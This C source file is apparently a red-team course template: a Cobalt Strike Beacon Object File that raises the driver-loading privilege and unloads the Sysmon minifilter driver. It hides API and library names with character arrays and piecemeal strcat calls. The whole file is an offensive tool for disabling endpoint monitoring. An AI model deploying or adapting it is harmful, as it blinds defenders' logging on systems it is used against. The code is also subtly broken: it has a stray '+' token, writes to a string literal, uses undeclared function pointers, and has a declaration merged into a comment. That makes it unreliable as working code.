/*
 Red Team Operator course code template
 Sysmon minifilter unload
 
 author: reenz0h (twitter: @SEKTOR7net)

*/

#include <windows.h>
#include <stdio.h>
#include <fltuser.h>
#include "..\beacon.h"
#include "..\bofdefs.h"

#pragma comment(lib, "FltLib.lib")
#pragma comment(lib, "Advapi32.lib")

#define ENABLE 1
#define DISABLE 0


BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
	HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

	if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		BeaconPrintf(CALLBACK_OUTPUT, "[-] OpenProcessToken() failed!\n");
		return FALSE;
	}

    if (!ADVAPI32$LookupPrivilegeValueA(
            NULL,            // lookup privilege on local system
            lpszPrivilege,   // privilege to lookup 
            &luid ) )        // receives LUID of privilege
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] LookupPrivilegeValue error: %u\n", KERNEL32$GetLastError() ); 
        return FALSE; 
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;+
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.

    if (!ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL) ) { 
          BeaconPrintf(CALLBACK_OUTPUT, "[-] AdjustTokenPrivileges error: %u\n", KERNEL32$GetLastError() ); 
          return FALSE; 
    }

    if (KERNEL32$GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
          BeaconPrintf(CALLBACK_OUTPUT, "[-] The token does not have the specified privilege.\n");
          return FALSE;
    }
    return TRUE;
}


// Usage: eva-sysmon-unload
void go(char *args, int alen) {
	if (!SetPrivilege(SE_LOAD_DRIVER_NAME, ENABLE)) {
		BeaconPrintf(CALLBACK_OUTPUT, "Failed to set the privilege for unloading the sysmon driver...\n");
		return;
	}
	
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Unloading sysmon minidriver...");
	
	// use function obfuscation on 'FilterLoad' and 'FilterUnload'
	// Dependency: FltLib.dll	unsigned char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };

	unsigned char sFilterLoad[] = { 'F','i','l','t','e','r','L','o','a','d', 0x00 }; 			
	unsigned char sFilterUnload[] = { 'F','i','l','t','e','r','U','n','l','o','a','d', 0x00 };  
	char * lib = "F";
	MSVCRT$strcat(lib,"l");
	MSVCRT$strcat(lib,"t");
	MSVCRT$strcat(lib,"L");
	MSVCRT$strcat(lib,"i");
	MSVCRT$strcat(lib,"b");
	MSVCRT$strcat(lib,".");
	MSVCRT$strcat(lib,"d");
	MSVCRT$strcat(lib,"l");
	MSVCRT$strcat(lib,"l");
	pFilterLoad = KERNEL32$GetProcAddress(KERNEL32$GetModuleHandle(lib), sFilterLoad);
	pFilterUnload = KERNEL32$GetProcAddress(KERNEL32$GetModuleHandle(lib), sFilterUnload);

	//HRESULT hres = pFilterLoad(L"ofltdrv");
	HRESULT hres = pFilterUnload(L"ofltdrv");
	if (hres == S_OK)
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Done.\n");
	else
		BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed.\n");
	return;
}


